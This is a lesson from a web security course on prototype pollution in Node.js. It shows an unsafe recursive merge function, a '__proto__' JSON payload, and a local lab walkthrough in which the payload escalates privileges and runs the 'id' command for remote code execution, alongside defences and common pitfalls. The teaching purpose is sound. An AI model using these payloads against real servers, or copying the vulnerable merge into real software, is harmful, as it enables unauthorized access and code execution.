---
title: "Lesson 9.4: Prototype Pollution in Node.js"
image:
  path: /assets/img/covers/web-9-4-prototype-pollution-nodejs.webp
  alt: "Prototype Pollution in Node.js"
date: 2024-06-15 17:20:00 +0700
categories: ["Web Security", "Web · API and Modern Web"]
tags: [web, prototype-pollution, rce]
render_with_liquid: false
---

By the end of this lesson you understand the mechanism of prototype pollution in JavaScript, why a naive merge function lets an attacker change the behavior of every object, and how to escalate privileges and then reach RCE on a real Node app. Pollution is only half the bug; a gadget turns the polluted property into real impact.

![Prototype Pollution in Node.js](/assets/img/web/web-9-4-prototype-pollution-nodejs.svg)
_A raw JSON __proto__ key reaches a recursive merge, writes into Object.prototype, and a gadget later reads the planted property._

Part: 9 (API and Modern Web) | Time: about 50 minutes | Difficulty: advanced

**Prerequisites:** basic JavaScript (object, prototype), and Lesson 8.2 (Insecure deserialization) to be comfortable with the idea of a gadget.

**Tools:** Node.js 18+ (the lab uses Node 20), curl, Burp Suite.

## Goals

After this lesson you understand the prototype chain in JavaScript and why `__proto__` is dangerous. You can recognize the unsafe merge/clone/assign pattern that leads to prototype pollution, tell pollution apart from a gadget (the link that turns pollution into harm), and exploit pollution to escalate privileges and reach RCE on a Node lab.

## 1. Theory

In JavaScript, almost every object inherits from a parent object called the **prototype**. When you read `obj.x` and `obj` itself does not have `x`, the engine walks up the **prototype chain** to keep looking, eventually reaching `Object.prototype`, the common parent of most objects. The special property `__proto__` of an object points at its prototype.

**Prototype pollution** happens when an attacker manages to write into `Object.prototype`. Because it is the common parent, every object created afterward "inherits" the planted property. For example, after `Object.prototype.isAdmin = true`, a brand new empty object `{}` also has `{}.isAdmin === true`.

The bug usually sits in functions that process objects by a key name the user controls: **deep merge**, **clone**, **set by path** (`set(obj, "a.b.c", v)`). A naive merge function walks every key of the input:

```js
function merge(target, source) {
  for (const key in source) {
    if (source[key] && typeof source[key] === "object") {
      if (!(key in target)) target[key] = {};
      merge(target[key], source[key]);   // recursion
    } else {
      target[key] = source[key];
    }
  }
}
```

If the input is the JSON `{"__proto__": {"isAdmin": true}}`, here is the key point: `JSON.parse` creates the key `"__proto__"` as an **own property**, not through a setter, so the `for...in` loop walks into it. When the recursion does `merge(target["__proto__"], ...)`, `target["__proto__"]` is `Object.prototype`, and we write `isAdmin` straight into it. The pollution is complete.

But pollution is only half of it. The other half is the **gadget**: a piece of code in the app (or a library) that reads a property which normally does not exist, and now exists thanks to the pollution, which changes the behavior. The impact depends on the gadget:

- **Privilege escalation / behavior change**: code checks `user.isAdmin`, `options.bypass` on an object that never set that field. Pollution makes every object "have" the field by default, passing the check.
- **DoS**: planting a property that breaks shared logic (for example overwriting something every object uses) makes the app fail across the board.
- **RCE (Remote Code Execution)**: the app reads a property that controls running a command or a path (for example `config.preprocess`, `options.shell`, or a template engine reading a planted option). Pollution plants the attacker's command into that property.

## 2. Demo

The lab in `labs/9.4/` is a pure Node app (it uses only built-in modules, no `npm install` needed). It has a buggy `merge()` function, a privilege-escalation gadget, and an RCE gadget.

Step 1, check the baseline. `/api/whoami` creates a new user that only sets `username`, not `isAdmin`:

```text
GET /api/whoami  ->  {"username":"guest","isAdmin":false}
```

Step 2, pollute through `/api/profile`. Send raw JSON so that `__proto__` becomes an own property when the server parses it:

```text
POST /api/profile
{"__proto__":{"isAdmin":true,"preprocess":"id"}}
-> {"ok":true,"settings":{}}
```

Notice that `settings` comes back empty, because the data did not go into `settings`, it climbed up into `Object.prototype`. Step 3, call `/api/whoami` again. Now every new object has `isAdmin`:

```text
GET /api/whoami
-> {"username":"guest","isAdmin":true,
    "flag":"FLAG{9.4_prototype_pollution_priv_esc}",
    "note":"object user moi tu nhien co isAdmin=true do Object.prototype bi o nhiem"}
```

Step 4, RCE. The `/api/export` endpoint builds a config with `Object.assign({}, DEFAULTS)` then reads `config.preprocess` to run a preprocessing command. The app never lets the client send this field, but the pollution in step 2 already planted `preprocess = "id"` into the prototype:

```text
POST /api/export  (body {})
-> preprocess_ran:    "id"
   preprocess_output: "uid=1000(haipanda) gid=1000(Administrator) groups=..."
   flag: "FLAG{9.4_prototype_pollution_to_rce}"
```

The `id` command runs for real on the machine. This is an application-dependent RCE gadget: many real prototype-pollution-to-RCE bugs look exactly like this, where pollution plants into an option that controls a command, a path, or a template that the app trusts.

## 3. Lab

- Vulnerable app: `labs/9.4/` (Node, binds `127.0.0.1:8075`, run locally per the lab README, and the exploit is also written in Node).
- Task:
  1. Confirm the baseline at `/api/whoami`.
  2. Pollute through `/api/profile` with a `__proto__` payload.
  3. Escalate privileges at `/api/whoami`, then reach RCE at `/api/export`.
- Hint: send the JSON body **raw**, do not let a client library build the object for you because it may drop `__proto__`. Try the `constructor.prototype` variant too, to understand why both routes lead to `Object.prototype`.
- Solution: `app.js`, `exploit.js` and `transcript.txt` in `labs/9.4/`.

## 4. Common pitfalls

- Writing a "lightweight" deep merge yourself instead of using a patched library, and forgetting to block `__proto__`/`constructor`/`prototype`.
- Filtering only `__proto__` and forgetting that `constructor.prototype` also reaches `Object.prototype`.
- Testing with an object built in code, so it does not reproduce, because only a payload parsed from JSON or the query string creates a true own property `__proto__`.
- Thinking "it only changes a few random variables". One field in the right place (a command option, a template, a path) is enough for RCE.

## 5. Further reading

- Olivier Arteau's original research on prototype pollution, and the "PP2RCE" series on gadgets in Node core.
- Node.js: consider `--disable-proto`, `Object.freeze(Object.prototype)`, and using `Map`/`Object.create(null)`.
- PortSwigger Web Security Academy: the Prototype pollution topic (including client-side).

## 6. Key takeaways

- Pollution needs two conditions: a sink that writes by a user-controlled key (merge/clone/set path), and a payload containing `__proto__` or `constructor.prototype`.
- Pollution is only dangerous when there is a gadget. Always look for a property the app reads but never sets a default for.
- `JSON.parse` keeps `__proto__` as an own property, which is why a raw JSON payload works.
- The impact ranges from privilege escalation to DoS to RCE depending on the gadget.
- This is a server-side Node bug, but prototype pollution also happens in client-side JavaScript (the DOM) and leads to XSS.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 9.4</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-web/9.4.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-web/9.4/app.js" download><i class="fa-solid fa-file"></i>app.js</a>
<a class="lab-file" href="/assets/labs-web/9.4/exploit.js" download><i class="fa-solid fa-file"></i>exploit.js</a>
<a class="lab-file" href="/assets/labs-web/9.4/transcript.txt" download><i class="fa-solid fa-file-lines"></i>transcript.txt</a>
</div>
</div>
